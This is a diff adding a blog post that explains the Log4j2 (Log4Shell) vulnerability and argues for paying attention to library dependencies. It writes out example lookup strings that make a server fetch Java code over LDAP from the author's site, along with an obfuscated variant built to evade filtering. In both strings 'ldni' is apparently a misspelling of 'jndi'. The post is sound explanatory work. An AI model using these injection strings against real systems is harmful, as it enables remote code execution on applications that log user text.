@@ -1,0 +1,20 @@
+<page>
+	<basic-blog>
+		<title>You should read your libraries</title>
+		<subtitle>It's time to pay off that tech debt</subtitle>
+		<keywords>log4j2, java, tech debt, libraries, dependencies</keywords>
+		<date>12/11/2021</date>
+		<content>
+			<p> So the <a href="https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/">Log4j2 vulnerability</a> rocked everyone's socks.</p>
+			<p>To summarize: Log4j2 is a ubiquitous, open-source logging framework used in many mid- to large-scale Java applications. You can learn about it on <a href="https://logging.apache.org/log4j/2.x/">their official page</a></p>
+
+			<p>Recently, an easy-to-exploit, hard-to-mitigate vulnerability was discovered, affecting software running Java 8 or older and using Log4j2 version 2.14.1 or older, that allows an attacker to remotely inject code into the application if they can get their own text logged somewhere. Here's the basics for those, like me, who aren't in the Java world:</p>
+			<ul class='normal'>
+				<li>Log4j2 allows for variable substitutions, or "lookups", in logs. Something like <code>${myData}</code> would try to get the value of the variable <code>myData</code></li>
+				<li>By default, <a href='https://gitbox.apache.org/repos/asf?p=logging-log4j2.git;a=blob;f=log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.java;h=8faf6f2a5b4495efdab525f5822642b368abf879;hb=refs/heads/release-2.x#l928'>this substitution is recursive</a>. So if the value of <code>myData</code> were the text <code>"${youData}"</code>, it will then look <em>that</em> up to get the value of from the variable <code>youData</code>.</li>
+				<li>The substitutions are very robust. So robust, in fact, that you can make web queries using JNDI and LDAP to load Java classes from the web. So if the value of <code>myData</code> were <code>"${ldni:ldap://needleful.net/exploit}"</code>, Log4js would make an LDAP query to my website to load Java resources, which could be malicious.</li>
+			</ul>
+			<p>So the exploit is pretty simple to execute, and very powerful. User text is reasonably logged in all sorts of places: usernames, comments, user agents for web browsers, and surely more. Because it's validated recursively, simply trying to filter suspicious text will be extremely hard, because I could write something like <code>"${ldni:${lower:l}${lower:d}${lower:a}${lower:p}://needleful.net/exploit}"</code>, or some other arbitrarily complicated lookup, and it will be validated fully. With some knowledge of a service, you could infect an entire network, even applications that aren't directly reading user input, so long as it logs <em>something</em> it gets from an infected application.</p>
+		</content>
+	</basic-blog>
+</page>
